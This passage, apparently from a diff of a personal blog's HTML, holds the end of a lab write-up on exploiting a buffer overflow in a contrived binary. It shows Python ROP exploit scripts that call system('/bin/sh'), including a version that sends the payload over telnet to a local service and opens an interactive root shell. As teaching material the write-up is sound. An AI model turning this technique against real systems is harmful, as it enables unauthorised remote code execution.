+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x000000</span>)  <span style="color:#75715e"># r14 : 0x0</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x000000</span>)  <span style="color:#75715e"># r15 : 0x0</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401152</span>)  <span style="color:#75715e"># test function</span>
+
+    print(<span style="color:#e6db74">&#34;Our payload:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> payload_out:
+        payload_out<span style="color:#f92672">.</span>write(payload)
+    <span style="color:#66d9ef">return</span> payload
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    exploit()
+</code></pre></div><p>We run the python script and generate our ROP exploit input.</p>
+<p><img src="/images/safe-pwn/pics/22.png#center" alt=""></p>
+<p>Again we set a breakpoint at <strong>test</strong> and run the program with our generated payload as input.</p>
+<p><img src="/images/safe-pwn/pics/23.png#center" alt=""></p>
+<p>When we hit the breakpoint and step through the subroutine we now have the stack address containing the string &ldquo;<em>/bin/sh</em>&rdquo; in the <strong>RDI</strong> register and the address of the <strong>system</strong> function in the <strong>EIP</strong> register. The program is now ready to execute <strong>system(&quot;/bin/sh&rdquo;)</strong>.</p>
+<p><img src="/images/safe-pwn/pics/24.png#center" alt=""></p>
+<p>Running the program outside of gdb and piping our payload to it as input gives us command-line shell access. Our exploit method is successful.</p>
+<p><img src="/images/safe-pwn/pics/28.png#center" alt=""></p>
+<hr>
+<h2 id="exploiting-the-networked-application">Exploiting the Networked Application</h2>
+<p>Running the program locally with our exploit payload piped directly to it as user input worked in getting us system shell access on our local machine, confirming our exploit works on the binary. Now we need to augment our exploit script to connect to the networked application running on the server and communicate with it. Rather than writing our payload to a file like we&rsquo;ve previously done we can use python&rsquo;s <a href="https://docs.python.org/3.8/library/telnetlib.html">telnetlib</a> module to establish a TCP connection to the server application and <a href="https://docs.python.org/3.8/library/telnetlib.html#telnetlib.Telnet.interact">interact</a> with it, emulating a very dumb <a href="https://en.wikipedia.org/wiki/Telnet">Telnet</a> client.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#e6db74">&#34;&#34;&#34;safe_pwn.py&#34;&#34;&#34;</span>
+
+<span style="color:#f92672">import</span> struct
+<span style="color:#f92672">from</span> telnetlib <span style="color:#f92672">import</span> Telnet
+
+HOST: str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+PORT: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+
+
+<span style="color:#75715e"># payload</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#f92672">-&gt;</span> bytes:
+    <span style="color:#e6db74">&#34;&#34;&#34;Build our payload.&#34;&#34;&#34;</span>
+    payload: bytes <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>)  <span style="color:#75715e"># overflow junk</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># rbp : string argument for system function</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401206</span>)  <span style="color:#75715e"># pop r13 ; pop r14 ; pop r15 ; ret</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401040</span>)  <span style="color:#75715e"># r13 -&gt; system</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x000000</span>)  <span style="color:#75715e"># r14 -&gt; 0x0</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x000000</span>)  <span style="color:#75715e"># r15 -&gt; 0x0</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401152</span>)  <span style="color:#75715e"># test function</span>
+    <span style="color:#66d9ef">return</span> payload
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+    <span style="color:#e6db74">&#34;&#34;&#34;Main function. Connect and interact
+</span><span style="color:#e6db74">    with server application.&#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">try</span>:
+        t_n: Telnet <span style="color:#f92672">=</span> Telnet(HOST, PORT)
+        t_n<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        t_n<span style="color:#f92672">.</span>write(exploit() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[#] SYSTEM PWNED!! [#]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        t_n<span style="color:#f92672">.</span>interact()
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">[#] DISCONNECTING [#]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        quit()
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ConnectionRefusedError</span>:
+        print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] COULD NOT CONNECT TO SERVER [!]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        quit()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><p>The script establishes a telnet connection to the server application and once it receives a <a href="https://en.wikipedia.org/wiki/Newline">newline</a> <a href="https://en.wikipedia.org/wiki/Control_character">control character</a>, sends our payload bytes followed by a newline, simulating a return key-press. It then emulates a minimal telnet client allowing us to run commands and receive the output. We run <strong>whoami</strong> and <strong>hostname</strong> to show that we are running a command-line shell on the server with root account privileges.</p>
+<p><img src="/images/safe-pwn/pics/25.png#center" alt=""></p>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>This was a very trivial exploit performed on a useless, weakly secured, poorly written and implemented application. However contrived the example, this did allow us to touch on a lot of concepts and methods that are applicable to real world exploit development such as binary inspection, binary security and protections, buffer overflow vulnerabilities, reverse engineering C program assembly code, program debugging, return-oreinted programming, and binary exploit development in Python. I enjoyed this section of the lab and learned a lot while completing it, as well as in writing this post and explaining the process.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p><a href="https://ctf101.org/binary-exploitation/relocation-read-only/">binary-exploitation/relocation-read-only</a>, <em>ctf101.org.</em>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p><a href="https://en.cppreference.com/w/c/io/gets">gets, gets_s</a>, <em>cppreference.com.</em>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">Return-Oriented-Programming(ROP FTW)</a>, <em>Saif El-Sherei.</em>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+    </section>
+</article>
+
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "plasticuproject-github-io-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+        <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a rel="me" class="symbol" href="https://www.github.com/plasticuproject">
+        <i class="fa-brands fa-github"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://fosstodon.org/@plasticuproject">
+        <i class="fa-brands fa-mastodon"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://pypi.org/user/plasticuproject">
+        <i class="fa-brands fa-python"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://cryptohack.org/user/snuggles">
+        <i class="fa-solid fa-brain"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://leetcode.com/plasticuproject">
+        <i class="fa-solid fa-code"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://app.hackthebox.com/profile/32882">
+        <i class="fa-solid fa-cube"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="mailto:plastic@plasticuproject.com">
+        <i class="fa-solid fa-envelope"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://plasticuproject.com/fingerprint.txt">
+        <i class="fa-solid fa-fingerprint"></i>
+    </a>
+    
+    <a rel="me" class="symbol" href="https://plasticuproject.com/pubkey.txt">
+        <i class="fa-solid fa-key"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+        © Copyright 2024 plasticuproject
+    
+    </p>
+</footer>
+
+    </section>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://plasticuproject.com/js/main.js"></script>
+<script src="https://plasticuproject.com/js/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+</body>
+</html>
